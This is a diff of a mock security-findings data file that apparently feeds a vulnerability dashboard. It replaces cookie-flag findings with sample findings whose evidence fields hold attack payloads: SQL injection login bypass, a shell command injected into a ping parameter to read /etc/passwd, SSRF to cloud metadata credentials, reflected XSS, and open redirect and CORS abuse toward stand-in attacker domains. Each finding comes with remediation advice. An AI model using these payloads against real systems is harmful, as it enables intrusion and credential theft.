-    "endpoint": "/catalog",
+    "endpoint": "/auth/logout?redirect_to=",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=a4QqU0eBIHrmI3mCe9lNR4e0O2PWhAkICuf5U6B/I946sKgoV4tYYwBMhUbrjXNKS//UwIpgWoaCdWOnZ/PvITTp5Ki7wJaPH05juyJP/Yf1j41cFSRf+b8YgfnG; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=a4QqU0eBIHrmI3mCe9lNR4e0O2PWhAkICuf5U6B/I946sKgoV4tYYwBMhUbrjXNKS//UwIpgWoaCdWOnZ/PvITTp5Ki7wJaPH05juyJP/Yf1j41cFSRf+b8YgfnG; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IkdkazI1Q2pHWUtId2hMWkYifQ==; Secure; HttpOnly",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /auth/logout?redirect_to=https://evil-phishing.com HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 302 Found\nLocation: https://evil-phishing.com",
+    "remediation": "Validate redirect URLs against an internal whitelist or only permit relative path redirects.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-601"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A01:2021-Broken Access Control"
     ],
-    "risk_score": 25.0,
+    "risk_score": 55.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -965,33 +954,32 @@ export const mockFindings = [
   },
   {
     "id": "56a3e6cb-b26f-4eab-891e-6be3f391dbbf",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Runtime SQL Injection in Authentication Endpoint",
+    "description": "Active blackbox injection fuzzing on the login authentication endpoint revealed unescaped SQL syntax errors and full authentication bypass via boolean SQL injection payloads.",
+    "severity": "CRITICAL",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "SQL Injection",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/blog",
+    "endpoint": "/api/v1/auth/login",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=FumRU18Ohr/as2ZE+hHOZfxNb2qwMjfTrVS02XaGhaeTp0uO7OAQKSRCblZCdrahxh/gsD+CRSGcyJrIVd5DhVZc7cICjmwet3WN0n5maxCGViVyYmXzG0prjCR2; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=FumRU18Ohr/as2ZE+hHOZfxNb2qwMjfTrVS02XaGhaeTp0uO7OAQKSRCblZCdrahxh/gsD+CRSGcyJrIVd5DhVZc7cICjmwet3WN0n5maxCGViVyYmXzG0prjCR2; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/auth/login HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"username\": \"admin' OR 1=1--\", \"password\": \"random_password\" }\n\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: auth_token=eyJhbGciOi...\n\n{\"status\": \"authenticated\", \"role\": \"superadmin\"}",
+    "remediation": "Use parameterized queries or prepared statements: db.query(\"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password]);",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-89"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A03:2021-Injection"
     ],
-    "risk_score": 25.0,
+    "risk_score": 98.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1000,33 +988,32 @@ export const mockFindings = [
   },
   {
     "id": "2e130ab2-996e-423d-8095-f952635e4c9b",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Remote Command Execution via Server Diagnostics",
+    "description": "Active injection probe into diagnostics ping parameter allowed execution of arbitrary operating system commands with container root privileges.",
+    "severity": "CRITICAL",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Command Injection",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/about",
+    "endpoint": "/api/v1/admin/diagnostics/ping",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=YoYiKXMK8qKNuPxn16+PbHeksjmbOnE7c8CSKK22ACNTgVq+2Mdg8kxtfU6bzkKeDfpBQmzHV5nwcwJSAzJuYJxkFxplhLCDVkGEe8IzfxFkCgaqyP8gFBAGWwa2; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=YoYiKXMK8qKNuPxn16+PbHeksjmbOnE7c8CSKK22ACNTgVq+2Mdg8kxtfU6bzkKeDfpBQmzHV5nwcwJSAzJuYJxkFxplhLCDVkGEe8IzfxFkCgaqyP8gFBAGWwa2; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/admin/diagnostics/ping HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"host\": \"127.0.0.1; id; cat /etc/passwd\" }\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nuid=0(root) gid=0(root) groups=0(root)\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Avoid invoking the system shell. Use execFile() or spawn() with argument arrays rather than concatenating user input into shell strings.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-78"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A03:2021-Injection"
     ],
-    "risk_score": 25.0,
+    "risk_score": 97.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1035,33 +1022,32 @@ export const mockFindings = [
   },
   {
     "id": "8a40a72d-138b-4a8e-8553-eda78fedc230",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Server-Side Request Forgery (SSRF) in Webhook Dispatcher",
+    "description": "Outgoing webhook subscription accepts unvalidated internal IP addresses, allowing attacker payloads to extract AWS cloud metadata tokens (169.254.169.254).",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Server-Side Request Forgery",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/my-account",
+    "endpoint": "/api/v1/webhooks/subscribe",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=1pd3PTSjyL0QW5WS2c1mZeB7fPJgek1oaF7dADkXvXkNtmQbPHWEn26VQAT7jsv1gemc/WvKUofYdNmJJI/ibTidG8V65gBlN8zTQfqk4LQPUQUjKJA5uXlcHMgj; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=1pd3PTSjyL0QW5WS2c1mZeB7fPJgek1oaF7dADkXvXkNtmQbPHWEn26VQAT7jsv1gemc/WvKUofYdNmJJI/ibTidG8V65gBlN8zTQfqk4LQPUQUjKJA5uXlcHMgj; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/webhooks/subscribe HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"callback_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }\n\nHTTP/1.1 200 OK\n\n{\"roleName\": \"production-ecs-task-role\", \"AccessKeyId\": \"AKIA...\", \"SecretAccessKey\": \"...\"}",
+    "remediation": "Validate destination URLs against an explicit domain whitelist. Resolve hostnames and block private IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254).",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-918"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A10:2021-Server-Side Request Forgery"
     ],
-    "risk_score": 25.0,
+    "risk_score": 87.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1070,33 +1056,32 @@ export const mockFindings = [
   },
   {
     "id": "6734936a-7763-4312-bde0-5594df2907ce",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Reflected Cross-Site Scripting (XSS) via Search Query",
+    "description": "Payload delivered in query string parameter is reflected directly into HTML DOM without escaping, enabling arbitrary JavaScript execution in victim browsers.",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Cross-Site Scripting",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/login",
+    "endpoint": "/search?q=",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=4Tlk6TPtdJdk1t6hkQPGrV/ZHta7iDMxYmn7KL3xK0Wnl0oNrLdjVpJgm3Egj1mtf7cFsOSkfi93ercb4TwEfS0ahuDSseWZXTf//PQ/YDK3Zkr8X8SjbqXmMiVx; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=4Tlk6TPtdJdk1t6hkQPGrV/ZHta7iDMxYmn7KL3xK0Wnl0oNrLdjVpJgm3Egj1mtf7cFsOSkfi93ercb4TwEfS0ahuDSseWZXTf//PQ/YDK3Zkr8X8SjbqXmMiVx; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class=\"search-results\">Results for: <script>alert(document.domain)</script></div>",
+    "remediation": "Ensure all user input rendered into HTML responses is properly contextual HTML entity encoded.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-79"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A03:2021-Injection"
     ],
-    "risk_score": 25.0,
+    "risk_score": 78.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1105,33 +1090,32 @@ export const mockFindings = [
   },
   {
     "id": "e9219616-0a41-40d5-9613-3e22b43a0911",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Broken Object-Level Authorization (IDOR) on Invoices",
+    "description": "Authenticated user can access competitor invoice records by modifying the numeric invoice_id parameter in GET requests without permission verification.",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Broken Access Control",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/cart",
+    "endpoint": "/api/v1/billing/invoices/1092",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=fpwUXgSBa4pEjN/bkT1ROCmkdprW421tGkukOfahRFiRVNgiDH8pO+/0SdW5FOf6tczWPgSCAH9GuDYJg27I+8gEoq/NAOsX9tGocEaFGMOC3lvT7purTYe/Ls9N; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=fpwUXgSBa4pEjN/bkT1ROCmkdprW421tGkukOfahRFiRVNgiDH8pO+/0SdW5FOf6tczWPgSCAH9GuDYJg27I+8gEoq/NAOsX9tGocEaFGMOC3lvT7purTYe/Ls9N; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /api/v1/billing/invoices/1092 HTTP/1.1\nHost: target-app.internal\nAuthorization: Bearer <unauthorized_tenant_token>\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"invoice_id\": 1092, \"customer\": \"Competitor Corp\", \"amount_due\": 45000, \"credit_card_last4\": \"4242\"}",
+    "remediation": "Enforce server-side authorization checks comparing user tenant identity against requested object ownership.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-639"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A01:2021-Broken Access Control"
     ],
-    "risk_score": 25.0,
+    "risk_score": 82.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1140,33 +1124,32 @@ export const mockFindings = [
   },
   {
     "id": "6b999807-72ff-4164-9334-82556b48a3be",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Permissive CORS Wildcard with Credentials Allowed",
+    "description": "API preflight responses echo back arbitrary client Origin headers while setting Access-Control-Allow-Credentials to true, allowing unauthorized cross-origin data theft.",
+    "severity": "MEDIUM",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Security Misconfiguration",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/product",
+    "endpoint": "/api/v1/user/profile",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=0/f0xda+LUqhqYO6l5/ZpOD4lfyNSFmB31spZPZz7TyKx9+WES7M1Uc9P4ylpRdOwYwRh4uYaRv3w5MjMwa/qbBITelxQyN52oepZCte4qBBKjchbcVqupRK1jwB; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=0/f0xda+LUqhqYO6l5/ZpOD4lfyNSFmB31spZPZz7TyKx9+WES7M1Uc9P4ylpRdOwYwRh4uYaRv3w5MjMwa/qbBITelxQyN52oepZCte4qBBKjchbcVqupRK1jwB; Expires=Thu, 10 Sep 2026 03:42:06 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=g0yorruvjz1zPgcX0526+0rDGCD+6IPewAwsTSpGWklyiIJjncy+Va09T5Bj7DdYeHS9qz0TJUJ/pgbtKZxAOUKuIaoyVNGJOJu/5ML/oMyT4FhWf6jF9nJCg/dz; Expires=Thu, 10 Sep 2026 03:42:07 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=g0yorruvjz1zPgcX0526+0rDGCD+6IPewAwsTSpGWklyiIJjncy+Va09T5Bj7DdYeHS9qz0TJUJ/pgbtKZxAOUKuIaoyVNGJOJu/5ML/oMyT4FhWf6jF9nJCg/dz; Expires=Thu, 10 Sep 2026 03:42:07 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=N/d1iz4rr9UfIRoCo0Q6+PqkRDxbDLaDn7ktb7VlUXJRUcrIWfK6mDQGLHo91tWNsLCv0z1uaSRndk6t9mxl+lK+wBkGMfizGyQwbWL2X4cUDzanYSeIkLUJizCq; Expires=Thu, 10 Sep 2026 03:42:07 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=N/d1iz4rr9UfIRoCo0Q6+PqkRDxbDLaDn7ktb7VlUXJRUcrIWfK6mDQGLHo91tWNsLCv0z1uaSRndk6t9mxl+lK+wBkGMfizGyQwbWL2X4cUDzanYSeIkLUJizCq; Expires=Thu, 10 Sep 2026 03:42:07 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "OPTIONS /api/v1/user/profile HTTP/1.1\nHost: target-app.internal\nOrigin: https://evil-attacker.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil-attacker.com\nAccess-Control-Allow-Credentials: true",
+    "remediation": "Do not reflect arbitrary Origin headers when Access-Control-Allow-Credentials is true. Restrict allowed origins to an explicit whitelist.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-942"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 25.0,
+    "risk_score": 68.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1175,8 +1158,8 @@ export const mockFindings = [
   },
   {
     "id": "5df8d22b-d289-4e83-b9f7-dcf9c76cf44e",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on Session Token",
+    "description": "The session cookie is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
     "severity": "LOW",
     "confidence": "HIGH",
     "category": "Session Management",
@@ -1185,17 +1168,16 @@ export const mockFindings = [
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
+    "endpoint": "/api/v1/auth/session",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=P/pj0o6j4f9xl6FlbivtkHdM4pWco8vXBYMOletnH7P2kv1anZnaC2dFHjUoKNdaJGKbwxmEDDtv3snJckO40jN8+j6yLw7dRe2En5mrjPP7QIS/XTElmCTy4Wig; Expires=Thu, 10 Sep 2026 03:42:07 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=P/pj0o6j4f9xl6FlbivtkHdM4pWco8vXBYMOletnH7P2kv1anZnaC2dFHjUoKNdaJGKbwxmEDDtv3snJckO40jN8+j6yLw7dRe2En5mrjPP7QIS/XTElmCTy4Wig; Expires=Thu, 10 Sep 2026 03:42:07 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "HTTP/1.1 200 OK\nSet-Cookie: session_token=eyJhbGciOi...; Path=/; Expires=Thu, 10 Sep 2026 03:41:42 GMT\n\n[OWASP ZAP Finding]: Set-Cookie header missing HttpOnly, Secure, SameSite flags",
+    "remediation": "Add HttpOnly, Secure, and SameSite=Lax (or Strict) attributes to all Set-Cookie headers.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-614"
     ],
     "cves": [],
     "owasp": [
@@ -1210,32 +1192,32 @@ export const mockFindings = [
   },
   {
     "id": "b634d854-0050-404e-b3d2-9dc8cfa7433a",
-    "title": "Missing Clickjacking Defense (X-Frame-Options / CSP frame-ancestors)",
-    "description": "The target web page does not enforce frame embedding restrictions, leaving users vulnerable to UI redressing (Clickjacking).",
-    "severity": "MEDIUM",
+    "title": "Missing HTTP Strict Transport Security (HSTS) Header",
+    "description": "Application fails to enforce HTTPS connections via HSTS response header, allowing man-in-the-middle attackers to downgrade connections to plaintext HTTP.",
+    "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Broken Access Control",
+    "category": "Cryptographic Failures",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
+    "endpoint": "/",
     "method": null,
     "parameter": null,
-    "evidence": "No 'X-Frame-Options' header or CSP 'frame-ancestors' directive detected in HTTP response.",
-    "remediation": "Set `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.",
+    "evidence": "GET / HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: Strict-Transport-Security header is absent in response headers.",
+    "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload header to all HTTPS responses.",
     "references": [
       "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
     ],
     "cwe": [
-      "CWE-1021"
+      "CWE-319"
     ],
     "cves": [],
     "owasp": [
       "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 50.0,
+    "risk_score": 31.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -1383,338 +1365,23 @@ export const mockFindings = [
   },
   {
     "id": "e19e59d2-6897-43cb-b98b-adee41053554",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Missing Content Security Policy (CSP) Header",
+    "description": "No Content Security Policy is defined, leaving client browsers unprotected against malicious inline scripts and unauthorized resource loading.",
     "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Security Misconfiguration",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/",
+    "endpoint": "/dashboard",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=nI4YutTX9gz6Ljx5o8VncNSk1OuflJ8o1LLmsAv9h8f8BTkmUfu/Z62y980JZM5wZ/xAwQG/0AhhnPT9/aOKnQT9eTzaF2dINyZMlA+wT7SqE5/ACSc6/J0yuwZV; Expires=Thu, 10 Sep 2026 03:55:55 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=nI4YutTX9gz6Ljx5o8VncNSk1OuflJ8o1LLmsAv9h8f8BTkmUfu/Z62y980JZM5wZ/xAwQG/0AhhnPT9/aOKnQT9eTzaF2dINyZMlA+wT7SqE5/ACSc6/J0yuwZV; Expires=Thu, 10 Sep 2026 03:55:55 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=k4yjOXvf8gPCBjlm18ba+cElLOsVFQ9BZCc3ImOfgrCHbxjlWrnIK040QYmmvvr2+iEE7PBnFO67FzyOSUq0zLcG+C+7Cax5ZFfvA6oMwoDA/Z31cx3HdWMfa935; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=k4yjOXvf8gPCBjlm18ba+cElLOsVFQ9BZCc3ImOfgrCHbxjlWrnIK040QYmmvvr2+iEE7PBnFO67FzyOSUq0zLcG+C+7Cax5ZFfvA6oMwoDA/Z31cx3HdWMfa935; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /dashboard HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: Content-Security-Policy (CSP) header is absent in response headers.",
+    "remediation": "Configure a strict Content-Security-Policy header: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521508"
-  },
-  {
-    "id": "869b88d1-03bf-41ea-9a62-01f188170e32",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/catalog",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=/WNqMYKfqTHH15aN2kNTBKfztN0LYaNVMwrmK75nvJQCzy03BHASjFc1yyAfzvJPQIl+19NN3jGkoPEBQ0gwedy3RHf3kJt9CJVo8rRpfKdXOvaqNMrbHDwVPwfE; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=/WNqMYKfqTHH15aN2kNTBKfztN0LYaNVMwrmK75nvJQCzy03BHASjFc1yyAfzvJPQIl+19NN3jGkoPEBQ0gwedy3RHf3kJt9CJVo8rRpfKdXOvaqNMrbHDwVPwfE; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6Ijlaa01WOEFObUw2dzF2Y1UifQ==; Secure; HttpOnly",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521514"
-  },
-  {
-    "id": "0d1a94d4-ec6f-4c09-ac89-db3a5f608b77",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/blog",
-    "method": null,
-    "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=jR3kmdFwyop5G34LeqejFugXaIsFNZy9gENtkbbEuMvZiI2UqRUyYHmRGfhRhgqmvx1WnQnRHxZEbvL1aY87qYAhv97UEtOXEGRDDas5t0txdFNBeD6bWKDOo7IC; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=jR3kmdFwyop5G34LeqejFugXaIsFNZy9gENtkbbEuMvZiI2UqRUyYHmRGfhRhgqmvx1WnQnRHxZEbvL1aY87qYAhv97UEtOXEGRDDas5t0txdFNBeD6bWKDOo7IC; Expires=Thu, 10 Sep 2026 03:55:56 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
-    "references": [
-      "https://owasp.org/www-community/controls/SecureCookieAttribute"
-    ],
-    "cwe": [
-      "CWE-614",
-      "CWE-1004"
-    ],
-    "cves": [],
-    "owasp": [
-      "A07:2021-Identification and Authentication Failures"
-    ],
-    "risk_score": 25.0,
-    "threat_scenario": null,
-    "potential_impact": {},
-    "blast_radius": null,
-    "status": "open",
-    "created_at": "2026-09-03T03:56:01.521516"
-  },
-  {
-    "id": "bc962568-76bf-4393-a325-3f5da98141ad",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
-    "confidence": "HIGH",
-    "category": "Session Management",
-    "source": "DAST",
-    "scanner": "owasp-zap",
-    "file": null,
-    "line": null,
-    "code_snippet": null,
-    "endpoint": "/about",
-    "method": null,
-    "parameter": null,
